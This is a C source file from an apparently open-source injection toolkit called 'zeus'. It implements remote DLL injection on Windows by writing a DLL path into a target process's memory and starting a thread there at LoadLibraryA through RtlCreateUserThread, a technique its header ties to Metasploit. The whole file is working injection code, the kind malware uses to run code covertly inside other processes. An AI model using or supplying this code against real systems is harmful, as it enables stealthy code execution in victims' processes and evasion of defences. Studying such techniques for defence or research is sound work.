/*
* ZeusRtlCreateUserThread.c : This file contains
* zeus project's implementation of remote dll injection
* by utilising RtlCreateUserThread Function
*
* It's basically an envelope to NtCreateThreadEx. It is very popular
*	and is heavily used in Metasploit Framework
*
* Written By : @Ice3man
*
*  Redistribution and use in source and binary forms, with or without
*  modification, are permitted provided that the following conditions
*  are met:
*
*   1. Redistributions of source code must retain the above copyright
*      notice, this list of conditions and the following disclaimer.
*   2. Redistributions in binary form must reproduce the above copyright
*      notice, this list of conditions and the following disclaimer in the
*      documentation and/or other materials provided with the distribution.
*
*  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
*  "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED
*  TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A
*  PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER
*  OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
*  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
*  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR
*  PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF
*  LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING
*  NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
*  SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/


#include "Zeus.h"

/*
* ZeusRtlCreateUserThread : Creates a thread in a remote
* process using the native API's.
*
* @Arguments :
*	@ProcID : Process ID Of Target Process
*	@szDllLocation : Location of Dll String
*
* @Return : 
*	@void
*/
int ZeusRtlCreateUserThread(int ProcID, char *szDllLoc)
{
	/*
	* Uses almost the same procedures but just calls
	* RtlCreateUserThread instead of CreateRemoteThread
	*/

	NTSTATUS status;
	HANDLE hThread;

	HANDLE hProcess = ZeusOpenProcess(ProcID);
	LPVOID arg = ZeusWriteDllStrMemory(szDllLoc, hProcess);

	LPVOID addr = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
	if (addr == NULL)
	{
#ifdef _DEBUG_
		printf("\n[!] Error : Could not get Library Address !");
#endif
		ExitProcess(1);
	}
	printf("\n[+] Got Address Of LoadLibraryA Successfully !");
	

	status=RtlCreateUserThread(hProcess, NULL, FALSE, 0, 0, 0, (PUSER_THREAD_START_ROUTINE)addr, arg, &hThread, NULL); // Start Thread
	if(!NT_SUCCESS(status))
	{
#ifdef _DEBUG_
		printf("\n[!] Error Occured Creating A Thread");
#endif 
		ExitProcess(1);
	}
	else {
		/*
		* Creating a remote thread succeeded.
		*/
		printf("\n[+] Successfully Created Remote Thread !");
		CloseHandle(hProcess);
		ExitProcess(0);
	}
	CloseHandle(hProcess);

}
